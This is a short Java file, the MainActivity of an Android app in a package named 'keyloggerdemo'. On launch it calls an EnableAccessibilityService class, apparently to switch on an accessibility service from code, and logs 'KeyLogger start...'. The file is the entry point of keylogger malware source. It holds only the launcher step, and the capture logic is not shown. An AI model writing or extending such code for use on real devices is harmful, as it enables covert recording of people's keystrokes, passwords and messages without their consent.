package com.dlive.keyloggerdemo;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

import com.dlive.keyloggerdemo.EnableAccessibility.EnableAccessibilityService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //enable accessibility service
        new EnableAccessibilityService().run();
        Log.d("keylogger", "KeyLogger start...");
    }
}